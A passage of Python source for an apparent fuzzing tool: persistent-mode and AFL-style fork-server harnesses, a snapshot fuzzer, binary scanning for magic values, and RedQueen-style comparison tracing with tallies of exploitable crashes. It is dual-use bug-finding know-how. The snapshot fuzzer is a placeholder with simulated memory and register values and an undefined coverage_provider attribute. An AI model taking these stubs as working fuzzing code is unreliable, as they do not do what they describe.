                                "severity": crash_info.severity.value,
                                "worker_id": worker_id,
                                "input_path": crash_info.input_path,
                            }

                    sanitizer_errors: List[MemoryError] = []
                    if is_new and self.sanitizer_runner:
                        sanitizer_errors = await self._run_sanitizer_replay(mutated)
                        if sanitizer_errors:
                            memory_errors = self.memory_safety_analyzer._deduplicate_errors(
                                memory_errors + sanitizer_errors
                            )
                            self.memory_safety_analyzer.record_errors(crash_info.id, memory_errors)
                        self.session.sanitizer_runs = self.sanitizer_runner.get_runs()

                    if memory_errors:
                        async with self._lock:
                            self.session.memory_errors_detected += len(memory_errors)
                            for mem_error in memory_errors:
                                if "heap" in mem_error.error_type.value:
                                    self.session.heap_errors += 1
                                if "stack" in mem_error.error_type.value:
                                    self.session.stack_errors += 1
                                if mem_error.error_type == MemoryErrorType.HEAP_USE_AFTER_FREE:
                                    self.session.uaf_errors += 1
                                if mem_error.severity in (
                                    CrashSeverity.EXPLOITABLE,
                                    CrashSeverity.PROBABLY_EXPLOITABLE,
                                ):
                                    self.session.exploitable_errors += 1

                    if is_new:
                        crash_event = {
                            "type": "new_crash",
                            "crash_id": crash_info.id,
                            "bucket_id": bucket_id,
                            "crash_type": crash_info.crash_type.value,
                            "severity": crash_info.severity.value,
                            "input_hash": crash_info.input_hash,
                            "worker_id": worker_id,
                        }
                        if memory_errors:
                            crash_event["memory_errors"] = [
                                {
                                    "type": e.error_type.value,
                                    "severity": e.severity.value,
                                    "description": e.description,
                                }
                                for e in memory_errors
                            ]
                        self._queue_event(crash_event)
                    else:
                        self._queue_event({
                            "type": "duplicate_crash",
                            "bucket_id": bucket_id,
                            "crash_type": crash_info.crash_type.value,
                            "worker_id": worker_id,
                        })
                
                # Small delay
                await asyncio.sleep(0.001)
        
        except asyncio.CancelledError:
            pass
        finally:
            worker_stats.status = "stopped"
            harness.cleanup()
            if coverage_provider:
                coverage_provider.close()
    
    async def _sync_loop(self):
        """Periodically sync corpus between workers."""
        while self._running:
            try:
                await asyncio.sleep(self.sync_interval)
            
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.debug(f"Sync error: {e}")
    
    def _aggregate_stats(self):
        """Aggregate statistics from all workers."""
        total_exec = 0
        total_crashes = 0
        
        for worker_stats in self.session.workers.values():
            total_exec += worker_stats.executions
            total_crashes += worker_stats.crashes
        
        self.session.total_executions = total_exec
        self.session.total_crashes = total_crashes
        self.session.unique_crashes = len(self._shared_crashes)
        self.session.total_coverage_edges = self.coverage_tracker.total_edges_discovered
        self.session.coverage_percentage = self.coverage_tracker.get_coverage_percentage()
        self.session.corpus_size = len(self.corpus_manager.entries)
        self.session.favored_inputs = len(self.corpus_manager.get_favored())
    
    def stop(self):
        """Stop all workers."""
        self._running = False
        self._cancel_event.set()
    
    def get_session(self) -> Dict[str, Any]:
        """Get current session state."""
        return self.session.to_dict()


# =============================================================================
# PERSISTENT MODE FUZZING (Low Priority - Phase 7)
# =============================================================================

class PersistentModeHarness:
    """
    Persistent mode execution harness.
    
    Keeps the target process alive between executions using
    shared memory for input delivery. Much faster than
    spawning new processes for each test case.
    
    Requires target to be compiled with persistent mode support.
    """
    
    def __init__(
        self,
        target_path: str,
        target_args: str = "",
        timeout_ms: int = 5000,
        max_executions_per_instance: int = 10000,
        shm_size: int = 65536,
        coverage_provider: Optional["CoverageProvider"] = None,
        environment: Optional[Dict[str, str]] = None,
    ):
        self.target_path = target_path
        self.target_args = target_args
        self.timeout_ms = timeout_ms
        self.max_execs = max_executions_per_instance
        self.shm_size = shm_size
        self.coverage_provider = coverage_provider
        self.environment = environment or {}
        
        self._process: Optional[asyncio.subprocess.Process] = None
        self._shm_name = f"/vrfuzz_{uuid.uuid4().hex[:8]}"
        self._shm_fd = None
        self._exec_count = 0
        self._running = False
        self.last_error: Optional[str] = None
        self._timeout_streak = 0
        
        self.stats = {
            "total_executions": 0,
            "restarts": 0,
            "crashes": 0,
            "timeouts": 0,
        }
    
    async def start(self):
        """Start the persistent target process."""
        if self._running:
            return
        
        # Create shared memory (platform dependent)
        await self._setup_shared_memory()
        
        # Build command with persistent mode flag
        cmd = [self.target_path]
        if self.target_args:
            cmd.extend(self.target_args.split())
        
        # Add shared memory identifier
        env = os.environ.copy()
        env["__VR_PERSISTENT"] = "1"
        env.update(self.environment)
        if self.coverage_provider and self.coverage_provider.is_available():
            env = self.coverage_provider.prepare_environment(env)
        
        self._process = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env,
        )
        
        await asyncio.sleep(0.05)
        if self._process and self._process.returncode is not None:
            self.last_error = "Persistent target exited immediately. Persistent mode may be unsupported."
            self._running = False
            return

        self._running = True
        self._exec_count = 0
        logger.info(f"Started persistent mode target: {self.target_path}")
    
    async def _setup_shared_memory(self):
        """Set up shared memory for input delivery."""
        # This is a simplified implementation
        # Real implementation would use mmap on Unix or CreateFileMapping on Windows
        self._shm_path = os.path.join(tempfile.gettempdir(), f"vrfuzz_shm_{uuid.uuid4().hex[:8]}")
        
        # Create the shared memory file
        with open(self._shm_path, "wb") as f:
            f.write(b"\x00" * self.shm_size)
    
    async def execute(self, input_data: bytes) -> 'ExecutionResult':
        """
        Execute a test case in persistent mode.
        
        Args:
            input_data: Input data to test
            
        Returns:
            Execution result
        """
        result = ExecutionResult()
        
        # Check if we need to restart
        if not self._running or self._exec_count >= self.max_execs:
            await self._restart()
        
        # Write input to shared memory
        await self._write_to_shm(input_data)
        
        start_time = time.time()
        
        try:
            # Signal target to process input (write newline to stdin)
            if self._process and self._process.stdin:
                self._process.stdin.write(b"\n")
                await self._process.stdin.drain()
            
            # Wait for completion signal (read from stdout)
            try:
                response = await asyncio.wait_for(
                    self._process.stdout.readline() if self._process and self._process.stdout else asyncio.sleep(0),
                    timeout=self.timeout_ms / 1000.0
                )
                
                result.exit_code = 0
                self._exec_count += 1
                self.stats["total_executions"] += 1
                self._timeout_streak = 0
                
                # Check for crash indicator
                if response and b"CRASH" in response:
                    result.crashed = True
                    result.crash_type = CrashType.UNKNOWN
                    self.stats["crashes"] += 1
                
            except asyncio.TimeoutError:
                result.timed_out = True
                self.stats["timeouts"] += 1
                self._timeout_streak += 1
                await self._restart()
        
        except Exception as e:
            result.crashed = True
            result.crash_type = CrashType.UNKNOWN
            self.stats["crashes"] += 1
            self.last_error = f"Persistent execution error: {e}"
            await self._restart()
        
        result.duration_ms = (time.time() - start_time) * 1000
        return result
    
    async def _write_to_shm(self, data: bytes):
        """Write input data to shared memory."""
        # Truncate to fit
        data = data[:self.shm_size - 4]
        
        # Write with length prefix
        with open(self._shm_path, "r+b") as f:
            f.write(struct.pack("<I", len(data)))
            f.write(data)
    
    async def _restart(self):
        """Restart the target process."""
        await self.stop()
        self.stats["restarts"] += 1
        await self.start()
    
    async def stop(self):
        """Stop the persistent target."""
        self._running = False
        
        if self._process:
            try:
                self._process.terminate()
                await asyncio.wait_for(self._process.wait(), timeout=1.0)
            except:
                self._process.kill()
            self._process = None
    
    def cleanup(self):
        """Clean up resources."""
        if hasattr(self, '_shm_path') and os.path.exists(self._shm_path):
            try:
                os.remove(self._shm_path)
            except:
                pass
    
    def get_stats(self) -> Dict[str, Any]:
        """Get execution statistics."""
        return {
            **self.stats,
            "current_exec_count": self._exec_count,
            "max_execs_per_instance": self.max_execs,
            "shm_size": self.shm_size,
        }


# =============================================================================
# FORK SERVER MODE (Low Priority - Phase 7) - Linux Only
# =============================================================================

class ForkServerHarness:
    """
    Fork server execution harness for fast process creation.
    
    Uses fork() to create child processes from a pre-initialized
    state, avoiding the overhead of full process startup.
    
    Linux only - falls back to regular execution on Windows.
    """
    
    # Control pipe commands
    CMD_FORK = b"\x00\x00\x00\x01"
    CMD_DONE = b"\x00\x00\x00\x02"
    
    def __init__(
        self,
        target_path: str,
        target_args: str = "@@",
        timeout_ms: int = 5000,
        coverage_provider: Optional["CoverageProvider"] = None,
        environment: Optional[Dict[str, str]] = None,
    ):
        self.target_path = target_path
        self.target_args = target_args
        self.timeout_ms = timeout_ms
        self.coverage_provider = coverage_provider
        self.environment = environment or {}
        
        self._fork_server_pid: Optional[int] = None
        self._ctl_pipe_w: Optional[int] = None  # Control pipe (parent writes)
        self._st_pipe_r: Optional[int] = None   # Status pipe (parent reads)
        self._running = False
        self._temp_dir = tempfile.mkdtemp(prefix="forkserver_")
        self._input_path = os.path.join(self._temp_dir, "input")
        self._exec_argv: Optional[List[str]] = None
        self.last_error: Optional[str] = None
        self._timeout_streak = 0
        
        self.stats = {
            "total_executions": 0,
            "crashes": 0,
            "timeouts": 0,
            "fork_failures": 0,
        }
        
        self._is_unix = os.name != "nt"
    
    async def start(self):
        """Start the fork server."""
        if not self._is_unix:
            self.last_error = "Forkserver not available on Windows."
            logger.info("Fork server not available on Windows, using regular execution")
            return
        
        if self._running:
            return

        if "@@" not in self.target_args:
            self.last_error = "Forkserver requires @@ input file argument."
            logger.info("Fork server requires @@ input file. Falling back to regular execution.")
            return

        args = self.target_args.replace("@@", self._input_path)
        self._exec_argv = [self.target_path] + shlex.split(args, posix=os.name != "nt")
        
        try:
            # Create pipes
            ctl_r, ctl_w = os.pipe()
            st_r, st_w = os.pipe()
            
            pid = os.fork()
            
            if pid == 0:
                # Child - become fork server
                os.close(ctl_w)
                os.close(st_r)
                
                # Redirect pipes to known file descriptors
                os.dup2(ctl_r, 198)  # AFL convention
                os.dup2(st_w, 199)
                os.close(ctl_r)
                os.close(st_w)
                
                # Exec target
                env = os.environ.copy()
                env.update(self.environment)
                env["__AFL_FORKSERVER"] = "1"
                if self.coverage_provider and self.coverage_provider.is_available():
                    env = self.coverage_provider.prepare_environment(env)
                
                os.execve(
                    self.target_path,
                    self._exec_argv or [self.target_path],
                    env
                )
            
            else:
                # Parent
                os.close(ctl_r)
                os.close(st_w)
                
                self._fork_server_pid = pid
                self._ctl_pipe_w = ctl_w
                self._st_pipe_r = st_r
                self._running = True
                
                # Wait for fork server ready signal
                try:
                    import select
                    ready = b""
                    deadline = time.time() + 1.0
                    while len(ready) < 4 and time.time() < deadline:
                        remaining = max(0.0, deadline - time.time())
                        readable, _, _ = select.select([self._st_pipe_r], [], [], remaining)
                        if readable:
                            ready += os.read(self._st_pipe_r, 4 - len(ready))
                        else:
                            break
                    if len(ready) == 4:
                        logger.info(f"Fork server started (PID {pid})")
                    else:
                        self.last_error = "Forkserver handshake failed. Target likely not AFL-instrumented."
                        self._running = False
                        self.stop()
                except Exception:
                    self.last_error = "Forkserver failed to start."
                    self._running = False
                    self.stop()
        
        except Exception as e:
            logger.error(f"Failed to start fork server: {e}")
            self.last_error = f"Forkserver start error: {e}"
            self._running = False
    
    async def execute(self, input_data: bytes) -> 'ExecutionResult':
        """
        Execute using fork server.
        
        Args:
            input_data: Input data to test
            
        Returns:
            Execution result
        """
        result = ExecutionResult()
        
        if self.coverage_provider and self.coverage_provider.is_available():
            try:
                self.coverage_provider.reset()
            except Exception:
                pass
        
        # Fall back to regular execution on non-Unix
        if not self._is_unix:
            return await self._regular_execute(input_data)
        
        if not self._running:
            await self.start()
            if not self._running:
                return await self._regular_execute(input_data)
        
        # Write input to temp file
        if self.coverage_provider and self.coverage_provider.is_available():
            try:
                self.coverage_provider.reset()
            except Exception:
                pass
        
        with open(self._input_path, "wb") as f:
            f.write(input_data)
        
        start_time = time.time()
        
        try:
            # Tell fork server to fork
            os.write(self._ctl_pipe_w, self.CMD_FORK)
            
            # Read child PID
            pid_data = os.read(self._st_pipe_r, 4)
            if len(pid_data) != 4:
                self.stats["fork_failures"] += 1
                self.last_error = "Forkserver protocol error while reading child PID."
                self._running = False
                await self.start()
                if not self._running:
                    return await self._regular_execute(input_data)
                result.crashed = True
                return result
            
            child_pid = struct.unpack("<I", pid_data)[0]
            
            # Wait for child with timeout
            import select
            deadline = time.time() + (self.timeout_ms / 1000.0)
            
            while True:
                remaining = deadline - time.time()
                if remaining <= 0:
                    # Timeout - kill child
                    try:
                        os.kill(child_pid, signal.SIGKILL)
                    except:
                        pass
                    result.timed_out = True
                    self.stats["timeouts"] += 1
                    self._timeout_streak += 1
                    break
                
                readable, _, _ = select.select([self._st_pipe_r], [], [], remaining)
                if readable:
                    # Read status
                    status_data = os.read(self._st_pipe_r, 4)
                    if len(status_data) == 4:
                        status = struct.unpack("<I", status_data)[0]
                        result.exit_code = os.WEXITSTATUS(status) if os.WIFEXITED(status) else -1
                        
                        if os.WIFSIGNALED(status):
                            result.crashed = True
                            sig = os.WTERMSIG(status)
                            if sig == signal.SIGSEGV:
                                result.crash_type = CrashType.ACCESS_VIOLATION_READ
                            elif sig == signal.SIGABRT:
                                result.crash_type = CrashType.ASSERTION_FAILURE
                            else:
                                result.crash_type = CrashType.UNKNOWN
                            self.stats["crashes"] += 1
                        self._timeout_streak = 0
                    break
            
            self.stats["total_executions"] += 1
            if self._timeout_streak >= 3:
                self.last_error = "Repeated timeouts; restarting forkserver."
                self._running = False
                await self.start()
        
        except Exception as e:
            logger.debug(f"Fork execution error: {e}")
            result.crashed = True
            self.last_error = f"Forkserver execution error: {e}"
        
        result.duration_ms = (time.time() - start_time) * 1000
        if self.coverage_provider and self.coverage_provider.is_available():
            try:
                result.coverage_data = self.coverage_provider.read_coverage()
            except Exception:
                pass
        return result
    
    async def _regular_execute(self, input_data: bytes) -> 'ExecutionResult':
        """Fall back to regular execution."""
        harness = ProcessHarness(
            self.target_path,
            self.target_args,
            self.timeout_ms,
            environment=self.environment,
            coverage_provider=self.coverage_provider,
        )
        result = await harness.execute(input_data)
        harness.cleanup()
        return result
    
    def stop(self):
        """Stop the fork server."""
        if self._fork_server_pid:
            try:
                os.kill(self._fork_server_pid, signal.SIGTERM)
                os.waitpid(self._fork_server_pid, 0)
            except:
                pass
        
        for fd in [self._ctl_pipe_w, self._st_pipe_r]:
            if fd:
                try:
                    os.close(fd)
                except:
                    pass
        
        self._running = False
    
    def cleanup(self):
        """Clean up resources."""
        self.stop()
        if os.path.exists(self._temp_dir):
            shutil.rmtree(self._temp_dir, ignore_errors=True)
    
    def get_stats(self) -> Dict[str, Any]:
        """Get execution statistics."""
        return {
            **self.stats,
            "fork_server_running": self._running,
            "fork_server_pid": self._fork_server_pid,
        }


# =============================================================================
# SNAPSHOT FUZZING (Low Priority - Phase 7)
# =============================================================================

@dataclass
class MemorySnapshot:
    """A memory snapshot for fast state restoration."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    memory_regions: List[Dict[str, Any]] = field(default_factory=list)
    registers: Dict[str, int] = field(default_factory=dict)
    file_descriptors: List[int] = field(default_factory=list)
    snapshot_path: str = ""
    size_bytes: int = 0


class SnapshotFuzzer:
    """
    Snapshot-based fuzzing for fast state restoration.
    
    Takes a memory snapshot at a specific program point and
    restores from it instead of restarting the process.
    
    Useful for:
    - Skipping initialization code
    - Fuzzing deep program states
    - Reducing startup overhead
    """
    
    def __init__(
        self,
        target_path: str,
        snapshot_point: Optional[str] = None,  # Function name or address
        timeout_ms: int = 5000,
        output_dir: Optional[str] = None,
    ):
        self.target_path = target_path
        self.snapshot_point = snapshot_point
        self.timeout_ms = timeout_ms
        self.output_dir = output_dir or tempfile.mkdtemp(prefix="snapshot_fuzz_")
        
        self._snapshot: Optional[MemorySnapshot] = None
        self._process = None
        
        self.stats = {
            "snapshots_taken": 0,
            "snapshots_restored": 0,
            "executions": 0,
            "crashes": 0,
            "restore_failures": 0,
        }
    
    async def take_snapshot(self) -> MemorySnapshot:
        """
        Take a memory snapshot of the target process.
        
        Returns:
            MemorySnapshot object
        """
        snapshot = MemorySnapshot(
            snapshot_path=os.path.join(self.output_dir, f"snapshot_{uuid.uuid4().hex[:8]}.bin")
        )
        
        # Start target and wait for snapshot point
        process = await asyncio.create_subprocess_exec(
            self.target_path,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        
        try:
            # In a real implementation, we would:
            # 1. Use ptrace to attach to the process
            # 2. Set a breakpoint at snapshot_point
            # 3. Wait for breakpoint hit
            # 4. Read memory mappings from /proc/pid/maps
            # 5. Read memory contents from /proc/pid/mem
            # 6. Save register state
            
            # Simplified: just wait a bit and save process state
            await asyncio.sleep(0.1)
            
            # Simulate memory dump
            snapshot.memory_regions = [
                {"start": 0x400000, "end": 0x401000, "perms": "r-x"},
                {"start": 0x600000, "end": 0x601000, "perms": "rw-"},
            ]
            snapshot.registers = {
                "rip": 0x400100,
                "rsp": 0x7fff0000,
                "rbp": 0x7fff0100,
            }
            
            # Save snapshot metadata
            with open(snapshot.snapshot_path, "wb") as f:
                import pickle
                pickle.dump({
                    "regions": snapshot.memory_regions,
                    "registers": snapshot.registers,
                }, f)
            
            snapshot.size_bytes = os.path.getsize(snapshot.snapshot_path)
            
        finally:
            process.terminate()
            try:
                await asyncio.wait_for(process.wait(), timeout=1.0)
            except:
                process.kill()
        
        self._snapshot = snapshot
        self.stats["snapshots_taken"] += 1
        
        logger.info(f"Snapshot taken: {snapshot.id} ({snapshot.size_bytes} bytes)")
        return snapshot
    
    async def execute_from_snapshot(self, input_data: bytes) -> 'ExecutionResult':
        """
        Execute from snapshot with given input.
        
        Args:
            input_data: Input data to test
            
        Returns:
            Execution result
        """
        result = ExecutionResult()
        
        if not self._snapshot:
            # No snapshot - take one first
            await self.take_snapshot()
        
        start_time = time.time()
        
        try:
            # In a real implementation, we would:
            # 1. Fork the process
            # 2. Restore memory contents
            # 3. Restore registers
            # 4. Inject input data
            # 5. Resume execution
            # 6. Wait for completion/crash
            
            # Simplified: just run the target normally
            self.stats["snapshots_restored"] += 1
            
            # Write input
            input_path = os.path.join(self.output_dir, "input.bin")
            with open(input_path, "wb") as f:
                f.write(input_data)
            
            # Execute
            process = await asyncio.create_subprocess_exec(
                self.target_path,
                input_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(),
                    timeout=self.timeout_ms / 1000.0
                )
                
                result.exit_code = process.returncode
                result.stdout = stdout
                result.stderr = stderr
                
                if process.returncode < 0 or process.returncode > 128:
                    result.crashed = True
                    result.crash_type = CrashType.UNKNOWN
                    self.stats["crashes"] += 1
            
            except asyncio.TimeoutError:
                result.timed_out = True
                process.kill()
            
            self.stats["executions"] += 1
        
        except Exception as e:
            logger.debug(f"Snapshot execution error: {e}")
            result.crashed = True
            self.stats["restore_failures"] += 1
        
        result.duration_ms = (time.time() - start_time) * 1000
        if self.coverage_provider and self.coverage_provider.is_available():
            try:
                result.coverage_data = self.coverage_provider.read_coverage()
            except Exception:
                pass
        return result
    
    def get_stats(self) -> Dict[str, Any]:
        """Get fuzzing statistics."""
        return {
            **self.stats,
            "has_snapshot": self._snapshot is not None,
            "snapshot_id": self._snapshot.id if self._snapshot else None,
        }
    
    def cleanup(self):
        """Clean up resources."""
        if os.path.exists(self.output_dir):
            shutil.rmtree(self.output_dir, ignore_errors=True)


# =============================================================================
# SYMBOLIC EXECUTION HINTS (Low Priority - Phase 7)
# =============================================================================

@dataclass
class SymbolicConstraint:
    """A constraint from symbolic execution."""
    variable: str
    constraint_type: str  # eq, ne, lt, gt, le, ge
    value: Any
    byte_offset: Optional[int] = None


@dataclass
class SymbolicHint:
    """A hint from symbolic execution to guide fuzzing."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    branch_address: int = 0
    taken_path: bool = True
    constraints: List[SymbolicConstraint] = field(default_factory=list)
    suggested_input: Optional[bytes] = None
    priority: float = 1.0  # Higher = more interesting


class SymbolicExecutionHintGenerator:
    """
    Generate fuzzing hints using lightweight symbolic execution.
    
    Analyzes the target to find:
    - Comparison operations
    - Branch conditions
    - Magic value checks
    
    Then generates inputs likely to flip branches.
    """
    
    def __init__(self, target_path: str):
        self.target_path = target_path
        self.hints: List[SymbolicHint] = []
        self.magic_values: Set[bytes] = set()
        self.comparison_offsets: List[int] = []
        
        self.stats = {
            "hints_generated": 0,
            "magic_values_found": 0,
            "branches_analyzed": 0,
        }
    
    def analyze_binary(self) -> Dict[str, Any]:
        """
        Analyze binary for symbolic hints.
        
        Returns:
            Analysis results
        """
        results = {
            "magic_values": [],
            "comparison_points": [],
            "interesting_strings": [],
        }
        
        try:
            with open(self.target_path, "rb") as f:
                binary_data = f.read()
            
            # Find magic values (common comparison targets)
            results["magic_values"] = self._find_magic_values(binary_data)
            self.magic_values = set(results["magic_values"])
            self.stats["magic_values_found"] = len(results["magic_values"])
            
            # Find comparison instructions (x86)
            results["comparison_points"] = self._find_comparisons(binary_data)
            self.stats["branches_analyzed"] = len(results["comparison_points"])
            
            # Find interesting strings
            results["interesting_strings"] = self._find_strings(binary_data)
            
        except Exception as e:
            logger.error(f"Binary analysis failed: {e}")
        
        return results
    
    def _find_magic_values(self, data: bytes) -> List[bytes]:
        """Find potential magic values/signatures in binary."""
        magic_values = []
        
        # Common file signatures
        signatures = [
            b"PK",      # ZIP
            b"JFIF",    # JPEG
            b"PNG",     # PNG
            b"GIF8",    # GIF
            b"PDF",     # PDF
            b"<?xml",   # XML
            b"<!DOCTYPE", # HTML
            b"{",       # JSON start
            b"[",       # JSON array
            b"MZ",      # PE
            b"\x7fELF", # ELF
        ]
        
        for sig in signatures:
            if sig in data:
                magic_values.append(sig)
        
        # Find 4-byte values that appear in CMP instructions
        # Simplified: look for repeated 4-byte sequences
        seen_values = {}
        for i in range(0, len(data) - 4, 4):
            val = data[i:i+4]
            seen_values[val] = seen_values.get(val, 0) + 1
        
        # Keep values that appear multiple times (likely constants)
        for val, count in seen_values.items():
            if count >= 3 and val not in (b"\x00\x00\x00\x00", b"\xff\xff\xff\xff"):
                magic_values.append(val)
        
        return magic_values[:50]  # Limit
    
    def _find_comparisons(self, data: bytes) -> List[Dict[str, Any]]:
        """Find comparison instruction patterns."""
        comparisons = []
        
        # x86 CMP instruction patterns (simplified)
        # CMP reg, imm8:  0x80 /7 ib or 0x83 /7 ib
        # CMP reg, imm32: 0x81 /7 id
        # CMP AL, imm8:   0x3C ib
        # CMP EAX, imm32: 0x3D id
        
        i = 0
        while i < len(data) - 5:
            # CMP AL, imm8
            if data[i] == 0x3C:
                comparisons.append({
                    "offset": i,
                    "type": "cmp_al_imm8",
                    "value": data[i+1],
                })
                i += 2
                continue
            
            # CMP EAX, imm32
            if data[i] == 0x3D:
                if i + 5 <= len(data):
                    val = struct.unpack("<I", data[i+1:i+5])[0]
                    comparisons.append({
                        "offset": i,
                        "type": "cmp_eax_imm32",
                        "value": val,
                    })
                i += 5
                continue
            
            i += 1
        
        self.comparison_offsets = [c["offset"] for c in comparisons]
        return comparisons[:100]  # Limit
    
    def _find_strings(self, data: bytes) -> List[str]:
        """Find interesting strings in binary."""
        strings = []
        
        # Find printable ASCII sequences
        current = []
        for b in data:
            if 32 <= b <= 126:
                current.append(chr(b))
            else:
                if len(current) >= 4:
                    s = "".join(current)
                    # Filter interesting strings
                    if any(kw in s.lower() for kw in 
                           ["error", "fail", "invalid", "password", "key", 
                            "secret", "admin", "root", "flag", "debug"]):
                        strings.append(s)
                current = []
        
        return strings[:50]
    
    def generate_hints(self, seed_input: bytes) -> List[SymbolicHint]:
        """
        Generate fuzzing hints based on seed input.
        
        Args:
            seed_input: Current seed input
            
        Returns:
            List of hints for improving coverage
        """
        hints = []
        
        # Generate hints to insert magic values at various offsets
        for magic in list(self.magic_values)[:10]:
            for offset in [0, 4, 8, len(seed_input) // 2]:
                hint = SymbolicHint(
                    branch_address=0,
                    constraints=[
                        SymbolicConstraint(
                            variable="input",
                            constraint_type="eq",
                            value=magic,
                            byte_offset=offset,
                        )
                    ],
                    suggested_input=self._create_suggested_input(seed_input, magic, offset),
                    priority=1.5,
                )
                hints.append(hint)
                self.stats["hints_generated"] += 1
        
        # Generate hints for comparison values
        for comp in self.comparison_offsets[:20]:
            # Create input that would satisfy the comparison
            hint = SymbolicHint(
                branch_address=comp,
                constraints=[
                    SymbolicConstraint(
                        variable="input",
                        constraint_type="eq",
                        value=comp,
                        byte_offset=0,
                    )
                ],
                priority=1.0,
            )
            hints.append(hint)
            self.stats["hints_generated"] += 1
        
        self.hints = hints
        return hints
    
    def _create_suggested_input(
        self, 
        seed: bytes, 
        value: bytes, 
        offset: int
    ) -> bytes:
        """Create a suggested input by inserting value at offset."""
        if offset >= len(seed):
            return seed + value
        
        result = bytearray(seed)
        end_offset = min(offset + len(value), len(result))
        for i, b in enumerate(value):
            if offset + i < len(result):
                result[offset + i] = b
        
        return bytes(result)
    
    def get_prioritized_mutations(
        self, 
        mutation_engine: 'MutationEngine',
        seed: bytes,
        num_mutations: int = 10,
    ) -> List[bytes]:
        """
        Get mutations prioritized by symbolic hints.
        
        Args:
            mutation_engine: Base mutation engine
            seed: Seed input
            num_mutations: Number of mutations to generate
            
        Returns:
            List of prioritized mutations
        """
        mutations = []
        
        # First, use hint-based mutations
        for hint in sorted(self.hints, key=lambda h: -h.priority)[:num_mutations // 2]:
            if hint.suggested_input:
                mutations.append(hint.suggested_input)
            else:
                # Apply constraints to seed
                mutated = bytearray(seed)
                for constraint in hint.constraints:
                    if constraint.byte_offset is not None and constraint.value:
                        val = constraint.value
                        if isinstance(val, int):
                            val = struct.pack("<I", val)
                        elif isinstance(val, str):
                            val = val.encode()
                        
                        offset = constraint.byte_offset
                        for i, b in enumerate(val):
                            if offset + i < len(mutated):
                                mutated[offset + i] = b
                
                mutations.append(bytes(mutated))
        
        # Fill rest with regular mutations
        while len(mutations) < num_mutations:
            mutations.append(mutation_engine.mutate(seed))
        
        return mutations
    
    def get_stats(self) -> Dict[str, Any]:
        """Get hint generation statistics."""
        return {
            **self.stats,
            "magic_values": [m.hex() for m in list(self.magic_values)[:10]],
            "hints_count": len(self.hints),
        }


# =============================================================================
# CMPLOG / REDQUEEN - INPUT-TO-STATE CORRESPONDENCE
# =============================================================================

@dataclass
class ComparisonLog:
    """A logged comparison operation from runtime execution."""
    address: int                    # Instruction address
    operand1: bytes                 # First operand value
    operand2: bytes                 # Second operand value
    operand_size: int               # Size in bytes (1, 2, 4, 8)
    comparison_type: str            # 'eq', 'ne', 'lt', 'le', 'gt', 'ge'
    input_offset: Optional[int]     # Offset in input where operand came from
    is_string_cmp: bool = False     # strcmp/memcmp style comparison


@dataclass
class InputToStateMapping:
    """Maps input bytes to comparison operands (I2S correspondence)."""
    input_offset: int               # Byte offset in input
    input_length: int               # Number of input bytes involved
    comparison_address: int         # Address of comparison instruction
    expected_value: bytes           # Value needed to satisfy comparison
    current_value: bytes            # Current value from input
    priority: float = 1.0           # Mutation priority


class CmpLogTracer:
    """
    CmpLog/RedQueen-style Input-to-State correspondence tracking.

    Implements the RedQueen technique from AFL++:
    1. Colorization: Run input with unique byte patterns to identify which
       input bytes flow to comparisons
    2. I2S Extraction: For each comparison, determine which input bytes
       affect the operands
    3. Targeted Mutation: Replace input bytes with comparison operands
       to satisfy branch conditions

    This dramatically improves coverage on targets with magic values,
    checksums, and multi-byte comparisons.
    """

    # Colorization patterns - unique sequences unlikely to appear naturally
    COLORIZATION_PATTERNS = [
        b"\xaa\xbb\xcc\xdd",
        b"\x11\x22\x33\x44",
        b"\xde\xad\xbe\xef",
        b"\xca\xfe\xba\xbe",
        b"\xfe\xed\xfa\xce",
        b"\x12\x34\x56\x78",
        b"\x87\x65\x43\x21",
        b"\xa1\xb2\xc3\xd4",
    ]

    def __init__(self, harness: 'ProcessHarness', max_colorization_runs: int = 32):
        self.harness = harness
        self.max_colorization_runs = max_colorization_runs

        # Collected comparison data
        self.comparison_logs: List[ComparisonLog] = []
        self.i2s_mappings: List[InputToStateMapping] = []
        self.auto_dictionary: Set[bytes] = set()

        # Statistics
        self.stats = {
            "colorization_runs": 0,
            "comparisons_logged": 0,
            "i2s_mappings_found": 0,
            "dictionary_entries_extracted": 0,
            "targeted_mutations_generated": 0,
        }

        # Cache for repeated analysis
        self._comparison_cache: Dict[bytes, List[ComparisonLog]] = {}

    async def analyze_input(self, input_data: bytes) -> List[InputToStateMapping]:
        """
        Analyze input using colorization to find I2S correspondences.

        This is the core RedQueen algorithm:
        1. Run original input and capture comparison operands
        2. Colorize input bytes and re-run to see which comparisons change
        3. Build mapping from input offsets to comparison values

        Args:
            input_data: The seed input to analyze

        Returns:
            List of input-to-state mappings for targeted mutation
        """
        if not input_data:
            return []

        input_hash = hashlib.sha256(input_data).digest()
        if input_hash in self._comparison_cache:
            return self._build_mappings_from_cache(input_hash, input_data)

        # Phase 1: Baseline execution - capture comparison operands
        baseline_comparisons = await self._capture_comparisons(input_data)
        self._comparison_cache[input_hash] = baseline_comparisons

        if not baseline_comparisons:
            return []

        # Phase 2: Colorization - identify which input bytes affect comparisons
        byte_to_comparison: Dict[int, List[Tuple[ComparisonLog, int]]] = {}

        # Colorize in chunks for efficiency
        chunk_size = max(1, len(input_data) // self.max_colorization_runs)

        for offset in range(0, len(input_data), chunk_size):
            end = min(offset + chunk_size, len(input_data))
            colorized = self._colorize_range(input_data, offset, end)

            colored_comparisons = await self._capture_comparisons(colorized)
            self.stats["colorization_runs"] += 1

            # Find comparisons that changed due to colorization
            for i, (baseline, colored) in enumerate(
                zip(baseline_comparisons, colored_comparisons)
            ):
                if baseline.operand1 != colored.operand1:
                    # Input bytes [offset:end] affect operand1
                    for byte_offset in range(offset, end):
                        if byte_offset not in byte_to_comparison:
                            byte_to_comparison[byte_offset] = []
                        byte_to_comparison[byte_offset].append((baseline, 1))

                if baseline.operand2 != colored.operand2:
                    # Input bytes [offset:end] affect operand2
                    for byte_offset in range(offset, end):
                        if byte_offset not in byte_to_comparison:
